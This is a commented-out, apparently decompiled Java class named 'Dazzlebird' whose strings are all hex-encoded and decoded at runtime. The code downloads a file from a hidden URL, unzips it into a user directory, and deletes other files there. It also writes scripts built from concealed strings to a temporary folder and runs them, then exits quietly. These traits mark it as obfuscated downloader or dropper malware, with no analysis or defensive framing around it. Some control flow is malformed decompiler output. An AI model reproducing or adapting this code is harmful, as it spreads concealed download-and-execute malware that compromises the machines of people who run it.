//package gabtype;
//
//import java.io.BufferedInputStream;
//import java.io.File;
//import java.io.FileOutputStream;
//import java.io.FileWriter;
//import java.io.IOException;
//import java.io.InputStream;
//import java.io.OutputStream;
//import java.io.PrintWriter;
//import java.net.URL;
//import java.security.CodeSource;
//import java.security.ProtectionDomain;
//import java.text.SimpleDateFormat;
//import java.util.Date;
//import java.util.Enumeration;
//import java.util.zip.ZipEntry;
//import java.util.zip.ZipException;
//import java.util.zip.ZipFile;
//
//public class Dazzlebird
//{
//  private static String a;
//  private static String b;
//  private static String c;
//  private static String d;
//  
//  private static String a(String paramString)
//  {
//    long l1 = Integer.decode("0x" + paramString.substring(0, 2)).intValue();
//    int i = 3;
//    String str = "";
//    do
//    {
//      long l2;
//      int j;
//      if ((j = (int)((l2 = Integer.decode("0x" + paramString.substring(i - 1, i + 1)).intValue()) ^ 0x31)) <= l1) {
//        j = (int)(j + 255 - l1);
//      } else {
//        j = (int)(j - l1);
//      }
//      str = str + (char)j;
//      l1 = l2;
//    } while (i += 2 < paramString.length());
//    return str;
//  }
//  
//  private static void a(File paramFile1, File paramFile2)
//  {
//    ZipFile localZipFile = null;
//    InputStream localInputStream = null;
//    FileOutputStream localFileOutputStream = null;
//    byte[] arrayOfByte = new byte['Ѐ'];
//    try
//    {
//      if (!paramFile2.exists()) {
//        paramFile2.mkdirs();
//      }
//      if ((!paramFile2.exists()) || (!paramFile2.isDirectory())) {
//        throw new IOException();
//      }
//      Enumeration localEnumeration = (localZipFile = new ZipFile(paramFile1)).entries();
//      for (;;)
//      {
//        if (!localEnumeration.hasMoreElements()) {
//          break label245;
//        }
//        localZipEntry = (ZipEntry)localEnumeration.nextElement();
//        paramFile1 = new File(paramFile2, localZipEntry.getName());
//        if ((!localZipEntry.isDirectory()) || (paramFile1.exists())) {
//          break;
//        }
//        paramFile1.mkdirs();
//      }
//      if (!paramFile1.getParentFile().exists()) {
//        paramFile1.getParentFile().mkdirs();
//      }
//    }
//    finally
//    {
//      label245:
//      try
//      {
//        for (;;)
//        {
//          ZipEntry localZipEntry;
//          localInputStream = localZipFile.getInputStream(localZipEntry);
//          localFileOutputStream = new FileOutputStream(paramFile1);
//          if (localInputStream == null) {
//            throw new ZipException();
//          }
//          while ((paramFile1 = localInputStream.read(arrayOfByte)) > 0) {
//            localFileOutputStream.write(arrayOfByte, 0, paramFile1);
//          }
//          if (localInputStream != null) {
//            try
//            {
//              localInputStream.close();
//            }
//            catch (Exception localException1) {}
//          }
//          try
//          {
//            localFileOutputStream.close();
//          }
//          catch (Exception localException2) {}
//        }
//      }
//      finally
//      {
//        if (localInputStream != null) {
//          try
//          {
//            localInputStream.close();
//          }
//          catch (Exception localException3) {}
//        }
//        if (localFileOutputStream != null) {
//          try
//          {
//            localFileOutputStream.close();
//          }
//          catch (Exception localException4) {}
//        }
//      }
//      try
//      {
//        localZipFile.close();
//      }
//      catch (Exception localException6) {}
//    }
//  }
//  
//  private static boolean b(String paramString)
//  {
//    return paramString = (paramString = new File(paramString)).exists();
//  }
//  
//  private static void a(Class paramClass)
//  {
//    Object localObject = System.getProperty(a("0843953DAFEC67E727AA29A83C9436"));
//    localObject = new File((String)localObject, System.getenv(a("D51A5C90D3136583F9")) + System.nanoTime() + a("65A228BB1E"));
//    FileWriter localFileWriter = new FileWriter((File)localObject, true);
//    paramClass = new File(paramClass.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
//    String str1 = System.getProperty(a("2EA93A81D333AA2BA93E")) + a("075285DF7FEA64F45A8A89DF69FF");
//    String str2 = System.getProperty(a("005B8D35A7E47FDF3F82DE7ED30C4F"));
//    localFileWriter.write(a("21419E8FE569EA6BEC3CBF14B61DBB10017ED27ADF") + "\r\n");
//    localFileWriter.write(a("1DA53E83DACB3E81D7084D83E377D0075BFE16096DE165FF4184DC7AD0CF27A13F95D962E468FC5B9BCC065A8C3063BD") + "\r\n");
//    localFileWriter.write(a("211B4D8CCD10428594E030B328A927B92CA0F960E277D873D27695D90C4F89C80C63E967E200508CC0DD70E96DA4E62D67A237AE10090D0E061E") + "\r\n");
//    localFileWriter.write(a("DBD5EFC9C63AAE2ABE0256AD26A33869FB5DFC61F559") + "\r\n");
//    localFileWriter.write(a("1D174988C92E5E90818F9EF1") + str2 + a("CE15679BF86399DD") + a("3E51") + "\r\n");
//    localFileWriter.write(a("1711B9134D88DCCD0D4DF0207FF46FEA61F7419B3E83C7DE71D070F4077B9584") + "\r\n");
//    localFileWriter.write(a("7FAEFF1100469E22BBEA1FA037A92FA5C519B229BD031A0D5188DC78D5354786C7055FF364E962E07E918B") + "\r\n");
//    localFileWriter.write(a("F92B7AABFA2A7BAAFB2D7C9BDF79EF6DE81FA63D91369B3061B2") + str1 + a("4354B1E221BA2DAEFF1304") + paramClass + a("14071809081B769384C70C4B9D2073AEEF") + "\r\n");
//    localFileWriter.write(a("2574A5F42458F76DBC25BF055C") + "\r\n");
//    localFileWriter.write(a("3667B6E73968B920A23798339236559937AD22A3F2177697F6") + "\r\n");
//    localFileWriter.write(a("6FBEEF2170F66DEA7E") + "\r\n");
//    localFileWriter.write(a("80B8F06BE0306F84DC78EC63EA65E96FD3CA1DBC1C40B0C2DACB71E87FDC") + "\r\n");
//    localFileWriter.write(a("5A4B5A4B5A4B5A4B5A4B5A4B5A4B5A4B5A4B5A80C217B813B21675F9578DC305147498F91B") + "\r\n");
//    localFileWriter.write(a("3C744C64A3D60D489C20B4CB04419786D676D71C6C9E") + "\r\n");
//    localFileWriter.write(a("5D575187C4180963F8") + "\r\n");
//    localFileWriter.write(a("FE75D206175FF95FF6") + "\r\n");
//    localFileWriter.close();
//    Runtime.getRuntime().exec(a("176B94C128A03E9332983DA8CA75D97FD57294F765ED5082C51EBF050256FF544556") + ((File)localObject).getAbsolutePath() + a("8192"));
//    Runtime.getRuntime().exit(0);
//  }
//  
//  private static void a(String paramString1, String paramString2)
//  {
//    BufferedInputStream localBufferedInputStream = null;
//    FileOutputStream localFileOutputStream = null;
//    try
//    {
//      localBufferedInputStream = new BufferedInputStream(new URL(paramString1).openStream());
//      localFileOutputStream = new FileOutputStream(paramString2);
//      paramString1 = new byte['Ѐ'];
//      while ((paramString2 = localBufferedInputStream.read(paramString1, 0, 1024)) != -1) {
//        localFileOutputStream.write(paramString1, 0, paramString2);
//      }
//      localBufferedInputStream.close();
//      localFileOutputStream.close();
//      return;
//    }
//    finally
//    {
//      if (localBufferedInputStream != null) {
//        localBufferedInputStream.close();
//      }
//      if (localFileOutputStream != null) {
//        localFileOutputStream.close();
//      }
//    }
//  }
//  
//  private static String c(String paramString)
//  {
//    return paramString = (paramString = b + a("4343") + paramString).replaceAll(a("8B8B"), a("C3115C"));
//  }
//  
//  private static void d(String paramString)
//  {
//    String str1 = System.getenv(a("84F677F577FD6399DA186884F8"));
//    String str2 = System.getenv(a("4D93D72C4FACDC1B51"));
//    paramString = paramString.replaceAll("/", "\\\\");
//    Object localObject = System.getProperty(a("1EB92A91C3C01BBBD87CD878ED66E9"));
//    localObject = new File((String)localObject, System.getenv(a("F77CFE75F67484E017")) + System.nanoTime() + a("8FD0075FA3E422AB28A5"));
//    FileWriter localFileWriter;
//    (localFileWriter = new FileWriter((File)localObject, true)).write(a("C937478ECA0617BC13B419B312B1DF3355B2D3C4D50A499D3C91CB0B43B1E2096C838183889BEB1B") + "\r\n");
//    localFileWriter.write(a("CC38BD2E90CADB63F95DE17AD8768295F71778ABFA429E3A993C485BF256FB5DA6E425A93C95CB0858FA18B42FA327A72AA83E8380D273D1309631AE22A029ADED117091F4157497F7548C306ED304468093E0") + "\r\n");
//    localFileWriter.write(a("70A1F01C5FF56CE469EC6EFE429A3B98D00E4585F2") + "\r\n");
//    localFileWriter.write(a("19081908196499CB71E7177899F8187494F512759BDE2164AFD03942474A49B0D83A4243444AB7D72DBF055BA8") + "\r\n");
//    localFileWriter.write(a("3465B4E53742B219BC14B21463") + str1 + a("CC18") + str2 + a("25504EBE054881C10572") + "\r\n");
//    localFileWriter.write(a("0E1F0E7B9BDC73EB64E66AED7EC31CBA18508FC40572") + "\r\n");
//    localFileWriter.write(a("3766B7C226A922B8114788CA38") + "\r\n");
//    localFileWriter.write(a("2071A0F1236E8BCB02409FC2045CF26BE16592") + "\r\n");
//    localFileWriter.write(a("79A8F92B7AABFA067AD90A5DF86FE210B519BF1461A1D777E97DD80F42B1") + "\r\n");
//    localFileWriter.write(a("031203120312030E52F46BEC075AA9") + str1 + a("BC28") + str2 + a("1461A1C70A5EE11A4FBC") + "\r\n");
//    localFileWriter.write(a("ED3F6EBFEE1A78F5548AC8066BEC67FF568ACD3D") + "\r\n");
//    localFileWriter.write(a("3667B6E73944A73C92CA0FB2144489C30241A426BE174F85C634") + "\r\n");
//    localFileWriter.write(a("D0C1D0C1D0C1D03CB02EBE104D83D624BB2CA92CA0ED2C409F30A321B72D5A") + "\r\n");
//    localFileWriter.write(a("9283928392FF1E4197CF084A8F33A52BA524A3C6084096CC0344B3") + "\r\n");
//    localFileWriter.write(a("F325748181E466FE578FC5094DBA") + "\r\n");
//    localFileWriter.write(a("DCCDDC28498AC200528ACB1CB91C6B") + "\r\n");
//    localFileWriter.write(a("FD2F7EAFFE0A6BEC67E479D375E765B42FA2EE2050F458F150F32754") + "\r\n");
//    localFileWriter.write(a("6FBEEF2170A1F01C4082D678F06493") + str1 + a("204D") + str2 + a("709DFD62E47BDC174AB9") + "\r\n");
//    localFileWriter.write(a("B1E03061B0E1335E9B3A9031AE329A3AAEDD16B51BB115479B21BB03599C3D99CF0F7A98D574EA6BE80CB41448B7") + "\r\n");
//    localFileWriter.write(a("44554455445544B1359B3BB62D92C6027188C019B027AB1163E87BD573E579D40B7694D77CDB194FF46BE614") + "\r\n");
//    localFileWriter.write(a("5E4F5E4F5EABEB0D4E86C518B010409DEA") + "\r\n");
//    localFileWriter.write(a("67B6E71575F4568ECD0058F96AE76A99") + "\r\n");
//    localFileWriter.write(a("584958A5C91EA329A323BB1E6D") + "\r\n");
//    localFileWriter.write(a("E43465B4E51351F755F853F26EE21DBA1FA23592C41BBF21A13F99CD7685FF56F554F76C8BC1087595D378D57BD577D20963E065E87BD80D4387E667E27DD17A89") + "\r\n");
//    localFileWriter.write(a("9889988998E51BB5184885C00149AD134586CB24BB3A99EA7DC00458FB5488CA38AF20BD0054A1E117B1144481DC7DC528AD3E81C43F94D27083D57BDE75D671E76A99") + "\r\n");
//    localFileWriter.write(a("2C7DACFD2F5A9C20BE1E568DE564FC5AF071EE0050F55BF1558FC50877DA7CC01762A0C2064485FF57AF2EA624BA3B98EB7CC1075DFE598F3241") + "\r\n");
//    localFileWriter.write(a("5746574657A2D20E4B8B324B9D21B438AC2EAA25A23598CC3A91C301459BE62759F4508E374E9E20B53B913593CD0D5FE27986") + "\r\n");
//    localFileWriter.write(a("3263B2E33540A226B618BD24BD12B1C30B5DF75587D874E816BB1FA53A4747AB114384C910499F3FB1194B85C0134481D727") + "\r\n");
//    localFileWriter.write(a("B2E33564B5C022A6244281DC6781D614488D349234AEDE64F46FEA7DEE6AFE0C43953397CD3B5B9C23A0DE7CD9629A304F85C871D175D122A93A92CF00538EC230") + "\r\n");
//    localFileWriter.write(a("0F1E0F1E0F7AF266E378FA51F458F06EE46996") + "\r\n");
//    localFileWriter.write(a("79A8F92B7AABFA0668ED6CED0C4BA53B96CA21BE1261E466EA61ACEA0FB213B23390E87CD90E62E17784") + "\r\n");
//    localFileWriter.write(a("65B4E53766B7E612558BCF75E76BEE0F4CA43895CB3B90C01CBE1560BE20B419BC2F9034B21068FD5BF101") + "\r\n");
//    localFileWriter.write(a("C1D0C1D0C1CCCA25B81448AA21A428A03E943946") + "\r\n");
//    localFileWriter.write(a("4455445544B1C3015CFA43A72DBF0346A422578DCB1CBB117EC3074D838E8CFC58F554FA7FC215B61A58F70D4381D373E614") + "\r\n");
//    localFileWriter.write(a("4859485948B5CB0B5D8ECB0055A226A92EA2EF2E4281D3074296CB3B") + "\r\n");
//    localFileWriter.write(a("D3C2D3C2D32158F064F96EED1DA022A63D4846BF184D80D47281") + "\r\n");
//    localFileWriter.write(a("8E9F8E9F8EFB7FC50565E27EC621B631A420B4C31B4D88CA010C0A6DD373F3538E39B32B459834A8D7") + "\r\n");
//    localFileWriter.write(a("091809180974FA6DE97EE36285CB0B78EF60FD4094E120469633A9CC0D6ED2709F") + "\r\n");
//    localFileWriter.write(a("5D4C5D4C5DA8DC64F86DD379D372D117B12EA2DF78D40FB2C1234647ABD6374DF46BFF4489C30241A43F9D324F89C70045B2") + "\r\n");
//    localFileWriter.write(a("F92B7AABFA0667E863E367E167D1216994F272D50E4C8FC90FB9C6") + "\r\n");
//    localFileWriter.write(a("3B6ABBC6C429BF054880DF76D826") + "\r\n");
//    localFileWriter.write(a("3D6CBDC83BAF154F8FCC71A0D273D074E850F5021567ED538AC80A1D6A") + "\r\n");
//    localFileWriter.write(a("C0D1C0D1C0CD22AB20B2C1") + "\r\n");
//    localFileWriter.write(a("3968B9E83869B8C538963593C50558A7") + paramString + a("C33151A524A03F9131A4D3") + "\r\n");
//    localFileWriter.write(a("95849584958495E013B42D9330A422A72A59A4E215B62F9532A624A92C5B") + "\r\n");
//    localFileWriter.write(a("9F8E9F8E9FEA2B4188DC719E") + "\r\n");
//    localFileWriter.write(a("889988F51464F65AF253F055A2") + "\r\n");
//    localFileWriter.write(a("51BCDA1E4EF06D9A") + "\r\n");
//    localFileWriter.close();
//    Thread.sleep(2000L);
//    paramString = a("5AFC5188CD1EA03D81908EE062F669EC63B2D014534255AE21A639") + System.nanoTime() + a("9B8C9D8C8A32AE2A7BAC") + localObject + a("1C0F");
//    Runtime.getRuntime().exec(paramString);
//    Thread.sleep(5000L);
//  }
//  
//  private static void b(Class paramClass)
//  {
//    Object localObject = System.getProperty(a("4780D076E624BC1D7ADF7CDD73ED51"));
//    localObject = new File((String)localObject, System.getenv(a("284CAEC22443B53246")) + System.nanoTime() + a("A9E66CFF42"));
//    FileWriter localFileWriter;
//    (localFileWriter = new FileWriter((File)localObject, true)).write(a("7AF85647BD014280C3D214488A31AF2475F269D074") + "\r\n");
//    localFileWriter.write(a("3B83DD63FA2A5CFF5484C91E5C8FC81FB31970A3C71ABD16B71DB7174F4CA33C99CF12BA1FA23997D70B4498CA0E011B") + "\r\n");
//    localFileWriter.write(a("1E164687C62BBF03127EAF33A92BA639AD227BE366F85AF252F7175B8F33AD2F92E96EEB6986D675EB29BD17B8D13458B0ED60F95DB4D6385048") + "\r\n");
//    localFileWriter.write(a("D1EBC5FF1F5286C318BD1269E361F729BB1DBC21B519") + "\r\n");
//    localFileWriter.write(a("330DB52FA927BDEC2A419B39AF24AD26A82CAEE73B") + new File(paramClass.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath() + a("2C7F99") + "\r\n");
//    localFileWriter.write(a("3564B5E43465B41DB71DB4E518BB104085DB1A4D86DA0FB2EB3FA33D9331ACEB1CBD1FBA15499B21BB1AB9EA25") + "\r\n");
//    localFileWriter.write(a("C8D9C8D9C8D9C8D9C8D9C8C70BB1110013B629AD28A23D983465A53D6CAA25A3F26CFC4292F166EF64B7E62263") + "\r\n");
//    localFileWriter.write(a("D1C0D1C0D1C0D1C0D1C0D118BA2F90C8084D4AAC28BC13B2E32766A7E6") + "\r\n");
//    localFileWriter.write(a("6BBAEB3D6CBDEC03409584EA65E860") + "\r\n");
//    localFileWriter.write(a("9485948594859485948594F3095FFA51F46B80D874E8386B") + new File(paramClass.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath() + a("3162") + "\r\n");
//    localFileWriter.write(a("AAFB2D7CAD34A826BB") + "\r\n");
//    localFileWriter.write(a("5286C51B0AB02BAE26") + "\r\n");
//    localFileWriter.close();
//    if (System.getenv(a("4B8ACD0C5EF257FB5AFD6CFC5EF068E064F86DD077D80F")).equals(a("4CF51F64"))) {
//      Runtime.getRuntime().exec(a("3549B23EA43F9C30AE17BB294DF75AFF54F01576E36AEC61E27DDC60BF14BD120314") + ((File)localObject).getAbsolutePath() + a("9788"));
//    } else {
//      Runtime.getRuntime().exec(a("80F21C4991CB0B5EFC4589D419A3264C8AD0365B86CC71E569E365E826BA02564758") + ((File)localObject).getAbsolutePath() + a("E93D"));
//    }
//    Runtime.getRuntime().exit(0);
//  }
//  
//  private static void e(String paramString)
//  {
//    if ((paramString = (paramString = new File(paramString)).listFiles()) != null)
//    {
//      int i = paramString.length;
//      for (int j = 0; j < i; j++)
//      {
//        Object localObject;
//        if (((localObject = paramString[j]).isFile()) && (!((File)localObject).isDirectory()))
//        {
//          if (((File)localObject).getName().contains(a("F210448DC3"))) {
//            try
//            {
//              String str = a("A329BB1EB8154F8AC7D637ACFD1CB41302") + ((File)localObject).getName();
//              Runtime.getRuntime().exec(str);
//              Thread.sleep(2000L);
//            }
//            catch (Exception localException) {}
//          }
//          if ((!((File)localObject).getName().contains(a("D432AD3E81"))) && (!((File)localObject).getName().contains(a("3D5AF25088"))) && (!((File)localObject).getName().contains(a("A5E26AE662"))) && (!((File)localObject).getName().contains(a("1675DE79D8")))) {
//            ((File)localObject).delete();
//          }
//        }
//      }
//    }
//  }
//  
//  private static Boolean a()
//  {
//    String str;
//    if ((str = System.getenv(a("1F5EE160F65888C43A92CF04465F868FF42F"))) != null) {
//      return Boolean.valueOf(true);
//    }
//    return Boolean.valueOf(false);
//  }
//  
//  private static String f(String paramString)
//  {
//    if (!a().booleanValue()) {
//      paramString = paramString + a("7896") + a("C8114B888A8D8A34AC2C");
//    } else {
//      paramString = paramString + a("69A9") + a("C22BA5256AAFEC568ECF");
//    }
//    return paramString;
//  }
//  
//  public static void main(String[] paramArrayOfString)
//  {
//    Object localObject1 = new Date();
//    Object localObject2;
//    localObject1 = (localObject2 = new SimpleDateFormat(a("BB1144A0DC67D17AC2"))).format((Date)localObject1);
//    localObject1 = System.getenv(a("6B9DDC1C51A3C639")) + a("D435") + (String)localObject1 + a("1473F40B63");
//    d = System.getProperty("os.name").toLowerCase();
//    b = System.getenv(a("ADDF016095E70D7F")) + a("1D7D") + a("6D8BC518BB1ABC1DB216");
//    c = c(System.getenv(a("2EA021BF01478ADE60FF508CC0")) + a("D73780D878"));
//    a = a("A53F82C70972908EC318BD0153F02EAB24BB100E504E");
//    if ((!b((String)localObject1)) && (!d.contains("xp")))
//    {
//      if (paramArrayOfString.length == 0)
//      {
//        a(Dazzlebird.class);
//        return;
//      }
//      (paramArrayOfString = new PrintWriter(System.getProperty(a("BD194BF063A03B9BF85CF8588DC70B")) + a("7EE21569A63147AB"), a("FE6588FF1C65"))).close();
//      a(f(a), c);
//      Object localObject3;
//      Object localObject4;
//      if (b(c))
//      {
//        e(b);
//        paramArrayOfString = new File(c);
//        localObject1 = new File(b);
//        a(paramArrayOfString, (File)localObject1);
//        paramArrayOfString.deleteOnExit();
//        localObject2 = c(a("EF0B5DE275") + System.nanoTime() + a("48479D27BD"));
//        localObject3 = new File((String)localObject2);
//        localObject4 = c(a("F154FB6ED072D57897CD77ED"));
//        (paramArrayOfString = new File((String)localObject4)).renameTo((File)localObject3);
//        Thread.sleep(2000L);
//        d((String)localObject2);
//      }
//      else
//      {
//        b(Dazzlebird.class);
//      }
//      paramArrayOfString = new Date();
//      paramArrayOfString = (localObject1 = new SimpleDateFormat(a("ED63F675F35CE46FD9"))).format(paramArrayOfString);
//      paramArrayOfString = System.getenv(a("ADDF016095E70D7F")) + a("1E7C") + paramArrayOfString + a("66A5C63DB5");
//      (paramArrayOfString = new FileWriter(new File(paramArrayOfString))).close();
//      paramArrayOfString = a("9237AE15B82CAA13B0E13E958480C3D2319485898899F76ABB3999304E85DA3857B4");
//      try
//      {
//        if (!a().booleanValue())
//        {
//          localObject1 = a("0E7FF508618190EE047BB9F21C679D3D91359F21A480BBD277ED5342B4CD3EA1CD3EAAD61D50A7C53FB2D73C54506B94FF75EB7EC10A4B8EAA859C21B71D0C7EF7086BF77CF109679ED3395F8DFB0C04201BBF0557F85C4D4D80918296C606479ACA0E5EB23EBA15498AC80D4D82C7D8C9104887DA7BC306055BE279A8E664E27BC11A0B538DCA1EBC0549468B359894AFC239B4E5396FDC729384");
//          localObject2 = c(System.getenv(a("71E564E060E468FC5EFD6EEA61")) + a("2261F265E8"));
//          localObject3 = new FileWriter((String)localObject2, true);
//          localObject4 = null;
//          try
//          {
//            ((FileWriter)localObject3).write((String)localObject1);
//            ((FileWriter)localObject3).close();
//          }
//          catch (Throwable localThrowable2)
//          {
//            throw paramArrayOfString;
//          }
//          finally
//          {
//            if (localObject4 != null) {
//              try
//              {
//                ((FileWriter)localObject3).close();
//              }
//              catch (Throwable localThrowable1)
//              {
//                ((Throwable)localObject4).addSuppressed(localThrowable1);
//              }
//            } else {
//              ((FileWriter)localObject3).close();
//            }
//          }
//          try
//          {
//            if ((localObject3 = new File((String)localObject2)).exists()) {
//              new ProcessBuilder(new String[] { localObject2 }).start();
//            }
//          }
//          catch (Exception localException1) {}
//        }
//        Runtime.getRuntime().exec(paramArrayOfString);
//      }
//      catch (Exception localException2) {}
//      b(Dazzlebird.class);
//      return;
//    }
//    b(Dazzlebird.class);
//  }
//}
